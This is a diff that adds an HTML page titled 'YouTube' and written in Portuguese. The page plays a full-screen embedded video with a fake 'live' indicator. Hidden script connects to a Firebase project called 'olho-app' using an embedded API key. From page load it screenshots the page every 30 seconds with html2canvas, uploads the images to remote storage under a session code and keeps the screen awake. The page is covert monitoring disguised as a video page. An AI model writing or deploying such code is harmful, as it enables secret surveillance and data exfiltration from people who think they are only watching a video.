@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="theme-color" content="#000000">
+    <title>YouTube</title>
+    
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        body {
+            background: #000;
+            height: 100vh;
+            width: 100vw;
+            overflow: hidden;
+            font-family: Arial, sans-serif;
+        }
+        
+        #youtubePlayer {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border: none;
+            z-index: 1;
+        }
+        
+        #statusOverlay {
+            position: fixed;
+            top: 15px;
+            right: 15px;
+            z-index: 10;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            background: rgba(0,0,0,0.6);
+            padding: 6px 12px;
+            border-radius: 20px;
+        }
+        
+        #statusDot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: #00ff88;
+            box-shadow: 0 0 10px #00ff88;
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0%,100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
+        
+        #statusText {
+            color: rgba(255,255,255,0.7);
+            font-size: 10px;
+            letter-spacing: 1px;
+        }
+        
+        #sessionCode {
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            z-index: 10;
+            color: rgba(255,255,255,0.3);
+            font-size: 11px;
+            letter-spacing: 3px;
+            background: rgba(0,0,0,0.5);
+            padding: 5px 14px;
+            border-radius: 12px;
+        }
+        
+        canvas { display: none; }
+    </style>
+</head>
+<body>
+    <iframe id="youtubePlayer" 
+        src="https://www.youtube.com/embed/5qap5aO4i9A?autoplay=1&mute=0&controls=0&loop=1" 
+        allow="autoplay" 
+        allowfullscreen>
+    </iframe>
+    
+    <div id="statusOverlay">
+        <div id="statusDot"></div>
+        <div id="statusText">AO VIVO</div>
+    </div>
+    
+    <div id="sessionCode">MEUCEL1</div>
+    
+    <canvas id="captureCanvas"></canvas>
+
+    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-storage-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"></script>
+
+    <script>
+        // CONFIGURAÇÃO FIREBASE
+        const firebaseConfig = {
+            apiKey: "AIzaSyC-V2j8XkXHLuQYyDypnCLUbmoVNphmiLc",
+            authDomain: "olho-app.firebaseapp.com",
+            databaseURL: "https://olho-app-default-rtdb.firebaseio.com",
+            projectId: "olho-app",
+            storageBucket: "olho-app.firebasestorage.app",
+            messagingSenderId: "821092537697",
+            appId: "1:821092537697:web:a919ec6ea6a073d6472120"
+        };
+        
+        firebase.initializeApp(firebaseConfig);
+        const storage = firebase.storage();
+        const database = firebase.database();
+        
+        const SESSION_CODE = 'MEUCEL1';
+        const INTERVAL = 30;
+        let count = 0;
+        
+        // INÍCIO AUTOMÁTICO
+        window.addEventListener('load', () => {
+            console.log('[MONITOR] Iniciando...');
+            
+            database.ref('sessions/' + SESSION_CODE).set({
+                online: true,
+                startedAt: new Date().toLocaleString('pt-BR'),
+                interval: INTERVAL
+            });
+            
+            setTimeout(() => {
+                captureAndUpload();
+                setInterval(captureAndUpload, INTERVAL * 1000);
+            }, 3000);
+        });
+        
+        async function captureAndUpload() {
+            try {
+                count++;
+                const ts = Date.now();
+                const now = new Date();
+                
+                console.log('[MONITOR] Capturando #' + count);
+                
+                const canvas = await html2canvas(document.body, {
+                    useCORS: true,
+                    allowTaint: true,
+                    scale: 0.6,
+                    logging: false,
+                    backgroundColor: '#000'
+                });
+                
+                const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.65));
+                
+                if (!blob || blob.size < 500) throw new Error('Vazia');
+                
+                const kb = Math.round(blob.size / 1024);
+                const filename = 'captures/' + SESSION_CODE + '/' + ts + '.jpg';
+                
+                // Upload
+                const task = storage.ref(filename).put(blob, {
+                    contentType: 'image/jpeg',
+                    customMetadata: {
+                        number: count,
+                        date: now.toLocaleString('pt-BR'),
+                        size: kb
+                    }
+                });
+                
+                task.on('state_changed', null, null, async () => {
+                    const url = await task.snapshot.ref.getDownloadURL();
+                    
+                    await database.ref('captures/' + SESSION_CODE + '/' + ts).set({
+                        filename: filename,
+                        url: url,
+                        time: now.toLocaleTimeString('pt-BR'),
+                        date: now.toLocaleString('pt-BR'),
+                        sizeKB: kb,
+                        number: count
+                    });
+                    
+                    await database.ref('sessions/' + SESSION_CODE).update({
+                        lastCapture: now.toLocaleTimeString('pt-BR'),
+                        totalCaptures: count
+                    });
+                    
+                    console.log('[MONITOR] OK #' + count);
+                });
+                
+            } catch(e) {
+                console.error('[MONITOR] Erro:', e.message);
+            }
+        }
+        
+        if ('wakeLock' in navigator) {
+            navigator.wakeLock.request('screen').catch(() => {});
+        }
+    </script>
+</body>
+</html>
